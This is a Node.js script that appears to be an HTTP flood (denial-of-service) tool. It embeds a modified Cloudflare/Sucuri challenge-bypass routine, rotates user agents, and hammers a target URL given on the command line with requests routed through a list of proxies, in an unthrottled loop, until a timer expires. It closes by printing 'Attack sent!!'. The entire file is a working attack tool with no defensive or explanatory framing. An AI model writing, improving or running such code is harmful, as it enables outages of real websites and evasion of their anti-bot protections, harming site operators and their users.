var vm = require('vm');
var requestModule = require('request');
var jar = requestModule.jar();
var fs = require('fs');
var proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n');

var EventEmitter = require('events').EventEmitter;
var eventEmitterInfinity = new EventEmitter(Infinity);
eventEmitterInfinity.setMaxListeners(Infinity);

var request = requestModule.defaults({
        jar: jar
    }), // Cookies should be enabled
    UserAgent = [	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
	"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"TheSuBot/0.2 (www.thesubot.de)",
	"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
	"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
	"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
	"zspider/0.9-dev http://feedback.redkolibri.com/",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
	"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
	"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
	"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
	"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
	"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
	"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",	
	"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01",	
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
	"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
],
    Timeout = 6000, // Cloudflare requires a delay of 5 seconds, so wait for at least 6.
    WAF = true,
    cloudscraper = {};


/**
 * Performs get request to url with headers.
 * @param  {String}    url
 * @param  {Function}  callback    function(error, response, body) {}
 * @param  {Object}    headers     Hash with headers, e.g. {'Referer': 'http://google.com', 'User-Agent': '...'}
 */
cloudscraper.get = function(url, callback, headers) {
    performRequest({
        method: 'GET',
        url: url,
        headers: headers
    }, callback);
};

/**
 * Performs post request to url with headers.
 * @param  {String}        url
 * @param  {String|Object} body        Will be passed as form data
 * @param  {Function}      callback    function(error, response, body) {}
 * @param  {Object}        headers     Hash with headers, e.g. {'Referer': 'http://google.com', 'User-Agent': '...'}
 */
cloudscraper.post = function(url, body, callback, headers) {
    var data = '',
        bodyType = Object.prototype.toString.call(body);

    if (bodyType === '[object String]') {
        data = body;
    } else if (bodyType === '[object Object]') {
        data = Object.keys(body).map(function(key) {
            return key + '=' + body[key];
        }).join('&');
    }

    headers = headers || {};
    headers['Content-Type'] = headers['Content-Type'] || 'application/x-www-form-urlencoded; charset=UTF-8';
    headers['Content-Length'] = headers['Content-Length'] || data.length;

    performRequest({
        method: 'POST',
        body: data,
        url: url,
        headers: headers
    }, callback);
}

/**
 * Performs get or post request with generic request options
 * @param {Object}   options   Object to be passed to request's options argument
 * @param {Function} callback  function(error, response, body) {}
 */
cloudscraper.request = function(options, callback) {
    performRequest(options, callback);
}

function performRequest(options, callback) {
    var method;
    options = options || {};
    options.headers = options.headers || {};
    makeRequest = requestMethod(options.method);

    //Can't just do the normal options.encoding || 'utf8'
    //because null is a valid encoding.
    if ('encoding' in options) {
        options.realEncoding = options.encoding;
    } else {
        options.realEncoding = 'utf8';
    }
    options.encoding = null;

    if (!options.url || !callback) {
        throw new Error('To perform request, define both url and callback');
    }

    options.headers['User-Agent'] = options.headers['User-Agent'] || UserAgent;

    makeRequest(options, function(error, response, body) {
        var validationError;
        var stringBody;

        if (error || !body || !body.toString) {
            return callback({
                errorType: 0,
                error: error
            }, body, response);
        }

        stringBody = body.toString('utf8');

        if (validationError = checkForErrors(error, stringBody)) {
            return callback(validationError, body, response);
        }

        // If body contains specified string, solve challenge
        if (stringBody.indexOf('a = document.getElementById(\'jschl-answer\');') !== -1) {
            setTimeout(function() {
                return solveChallenge(response, stringBody, options, callback);
            }, Timeout);
        } else if (stringBody.indexOf('You are being redirected') !== -1 ||
            stringBody.indexOf('sucuri_cloudproxy_js') !== -1) {
            setCookieAndReload(response, stringBody, options, callback);
        } else {
            // All is good
            processResponseBody(options, error, response, body, callback);
        }
    });
}

function checkForErrors(error, body) {
    var match;

    // Pure request error (bad connection, wrong url, etc)
    if (error) {
        return {
            errorType: 0,
            error: error
        };
    }

    // Finding captcha
    if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body)) {
        return {
            errorType: 1
        };
    }

    // trying to find '<span class="cf-error-code">1006</span>'
    match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);

    if (match) {
        return {
            errorType: 2,
            error: parseInt(match[1])
        };
    }

    return false;
}


function solveChallenge(response, body, options, callback) {
    var challenge = body.match(/name="jschl_vc" value="(\w+)"/),
        host = response.request.host,
        makeRequest = requestMethod(options.method),
        jsChlVc,
        answerResponse,
        answerUrl;

    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract challengeId (jschl_vc) from page'
        }, body, response);
    }

    jsChlVc = challenge[1];

    challenge = body.match(/getElementById\('cf-content'\)[\s\S]+?setTimeout.+?\r?\n([\s\S]+?a\.value =.+?)\r?\n/i);

    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract method from setTimeOut wrapper'
        }, body, response);
    }

    challenge_pass = body.match(/name="pass" value="(.+?)"/)[1];

    challenge = challenge[1];

    challenge = challenge.replace(/a\.value =(.+?) \+ .+?;/i, '$1');

    challenge = challenge.replace(/\s{3,}[a-z](?: = |\.).+/g, '');
    challenge = challenge.replace(/'; \d+'/g, '');

    try {
        answerResponse = {
            'jschl_vc': jsChlVc,
            'jschl_answer': (eval(challenge) + response.request.host.length),
            'pass': challenge_pass
        };
    } catch (err) {
        return callback({
            errorType: 3,
            error: 'Error occurred during evaluation: ' + err.message
        }, body, response);
    }

    answerUrl = response.request.uri.protocol + '//' + host + '/cdn-cgi/l/chk_jschl';

    options.headers['Referer'] = response.request.uri.href; // Original url should be placed as referer
    options.url = answerUrl;
    options.qs = answerResponse;

    // Make request with answer
    makeRequest(options, function(error, response, body) {

        if (error) {
            return callback({
                errorType: 0,
                error: error
            }, response, body);
        }

        if (response.statusCode === 302) { //occurrs when posting. request is supposed to auto-follow these
            //by default, but for some reason it's not
            options.url = response.headers.location;
            delete options.qs;
            makeRequest(options, function(error, response, body) {
                processResponseBody(options, error, response, body, callback);
            });
        } else {
            processResponseBody(options, error, response, body, callback);
        }
    });
}

function setCookieAndReload(response, body, options, callback) {
    var challenge = body.match(/S='([^']+)'/);
    var makeRequest = requestMethod(options.method);

    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract cookie generation code from page'
        }, body, response);
    }

    var base64EncodedCode = challenge[1];
    var cookieSettingCode = new Buffer(base64EncodedCode, 'base64').toString('ascii');

    var sandbox = {
        location: {
            reload: function() {}
        },
        document: {}
    };
    vm.runInNewContext(cookieSettingCode, sandbox);
    try {
        cookies.push(sandbox.document.cookie);
        jar.setCookie(sandbox.document.cookie, response.request.uri.href, {
            ignoreError: true
        });
    } catch (err) {
        return callback({
            errorType: 3,
            error: 'Error occurred during evaluation: ' + err.message
        }, body, response);
    }

    makeRequest(options, function(error, response, body) {
        if (error) {
            return callback({
                errorType: 0,
                error: error
            }, response, body);
        }
        processResponseBody(options, error, response, body, callback);
    });
}

// Workaround for better testing. Request has pretty poor API
function requestMethod(method) {
    // For now only GET and POST are supported
    method = method.toUpperCase();

    return method === 'POST' ? request.post : request.get;
}

function processResponseBody(options, error, response, body, callback) {
    if (typeof options.realEncoding === 'string') {
        body = body.toString(options.realEncoding);
        // In case of real encoding, try to validate the response
        // and find potential errors there.
        // If encoding is not provided, return response as it is
        if (validationError = checkForErrors(error, body)) {
            return callback(validationError, response, body);
        }
    }


    callback(error, response, body);
}

process.on('uncaughtException', function(err) {

})

process.on('unhandledRejection', function(err) {

});

var ATTACK = {
    http(method, url, proxy) {
        requestModule({
            method: method,
            proxy: 'http://' + proxy,
            headers: {
                'UserAgent': UserAgent[Math.floor(Math.random() * UserAgent.length)]
            },
            url: url
        }, function(err, response, body) {
            console.log(err, response.statusCode);
        });
    },
    cfbypass(method, url, proxy) {
        performRequest({
            method: method,
            proxy: 'http://' + proxy,
            headers: {
                'UserAgent': UserAgent[Math.floor(Math.random() * UserAgent.length)]
            },
            url: url
        }, function(err, response, body) {
            console.log(err, response.statusCode);        });
    }
}

setTimeout(function() {
    process.exit(1);
}, process.argv[3] * 1000);

setInterval(function() {
    ATTACK.http('GET', process.argv[2], proxies[Math.floor(Math.random() * proxies.length)]);
});

console.log('Attack sent!!');